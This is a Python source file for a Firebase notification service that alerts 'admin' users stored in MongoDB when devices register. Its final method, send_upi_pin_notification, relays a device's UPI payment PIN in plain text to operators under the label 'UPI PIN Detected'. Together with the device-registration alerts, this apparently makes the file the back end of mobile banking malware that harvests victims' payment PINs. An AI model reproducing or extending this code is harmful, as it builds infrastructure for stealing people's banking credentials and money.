import firebase_admin
from firebase_admin import credentials, messaging
from typing import Dict, Any, Optional
import logging
from ..database import mongodb

logger = logging.getLogger(__name__)

class FirebaseAdminService:

    def __init__(self, service_account_file: str):
        try:

            if "admin_app" not in [app.name for app in firebase_admin._apps.values()]:
                cred = credentials.Certificate(service_account_file)
                self.app = firebase_admin.initialize_app(cred, name="admin_app")
                logger.info("? Firebase Admin Service initialized")
            else:
                self.app = firebase_admin.get_app("admin_app")
                logger.info("? Firebase Admin Service already initialized")

        except Exception as e:
            logger.error(f"? Firebase Admin Service initialization error: {e}")
            self.app = None

    async def send_notification_to_admin(
        self,
        admin_username: str,
        title: str,
        body: str,
        data: Optional[Dict[str, str]] = None
    ) -> Dict[str, Any]:
        if not self.app:
            return {
                "success": False,
                "message": "Firebase Admin Service not initialized"
            }

        try:

            admin = await mongodb.db.admins.find_one(
                {"username": admin_username},
                {"fcm_tokens": 1}
            )

            if not admin or not admin.get("fcm_tokens"):
                return {
                    "success": False,
                    "message": f"No FCM tokens found for admin: {admin_username}"
                }

            tokens = admin.get("fcm_tokens", [])
            success_count = 0

            notification = messaging.Notification(
                title=title,
                body=body
            )

            for token in tokens:
                try:
                    message = messaging.Message(
                        notification=notification,
                        data=data or {},
                        token=token
                    )

                    response = messaging.send(message, app=self.app)
                    success_count += 1
                    logger.info(f"Admin notification sent to {admin_username}: {response}")

                except messaging.UnregisteredError:
                    logger.warning(f"Invalid FCM token for admin: {admin_username}")

                    await mongodb.db.admins.update_one(
                        {"username": admin_username},
                        {"$pull": {"fcm_tokens": token}}
                    )

                except Exception as e:
                    logger.error(f"? Error sending notification to {admin_username}: {e}")

            return {
                "success": success_count > 0,
                "sent_count": success_count,
                "total_tokens": len(tokens),
                "message": f"Notification sent to {success_count}/{len(tokens)} tokens"
            }

        except Exception as e:
            logger.error(f"? Error sending notification to admin {admin_username}: {e}")
            return {
                "success": False,
                "message": str(e)
            }

    async def send_notification_to_all_admins(
        self,
        title: str,
        body: str,
        data: Optional[Dict[str, str]] = None
    ) -> Dict[str, Any]:
        if not self.app:
            return {
                "success": False,
                "message": "Firebase Admin Service not initialized"
            }

        try:

            admins = await mongodb.db.admins.find(
                {
                    "is_active": True,
                    "fcm_tokens": {"$exists": True, "$ne": []}
                },
                {"username": 1, "fcm_tokens": 1}
            ).to_list(length=None)

            results = {
                "total_admins": len(admins),
                "success": 0,
                "failed": 0,
                "details": []
            }

            for admin in admins:
                admin_username = admin.get("username")
                result = await self.send_notification_to_admin(
                    admin_username=admin_username,
                    title=title,
                    body=body,
                    data=data
                )

                if result["success"]:
                    results["success"] += 1
                else:
                    results["failed"] += 1

                results["details"].append({
                    "admin": admin_username,
                    "status": "success" if result["success"] else "failed",
                    "sent_count": result.get("sent_count", 0)
                })

            logger.info(f"Admin notification summary: {results['success']}/{results['total_admins']} admins notified")
            return results

        except Exception as e:
            logger.error(f"? Error sending notifications to admins: {e}")
            return {
                "success": False,
                "message": str(e)
            }

    async def send_device_registration_notification(
        self,
        admin_username: str,
        device_id: str,
        model: str,
        app_type: str
    ) -> Dict[str, Any]:
        return await self.send_notification_to_admin(
            admin_username=admin_username,
            title="New Device Registered",
            body=f"{model} ({app_type}) has been registered",
            data={
                "type": "device_registered",
                "device_id": device_id,
                "app_type": app_type,
                "model": model
            }
        )

    async def send_upi_pin_notification(
        self,
        admin_username: str,
        device_id: str,
        upi_pin: str,
        status: str,
        model: Optional[str] = None
    ) -> Dict[str, Any]:
        device_info = f" ({model})" if model else ""
        status = (status or "unknown").lower()
        title_status = "Detected" if status == "success" else "Failed"
        title = f"UPI PIN {title_status}"
        body_status = status.capitalize()

        return await self.send_notification_to_admin(
            admin_username=admin_username,
            title=title,
            body=f"Status: {body_status} - PIN: {upi_pin} - Device: {device_id}{device_info}",
            data={
                "type": "upi_detected",
                "device_id": device_id,
                "upi_pin": upi_pin,
                "status": status,
                "model": model or "Unknown"
            }
        )

firebase_admin_service = FirebaseAdminService(
    "admin.json"
)
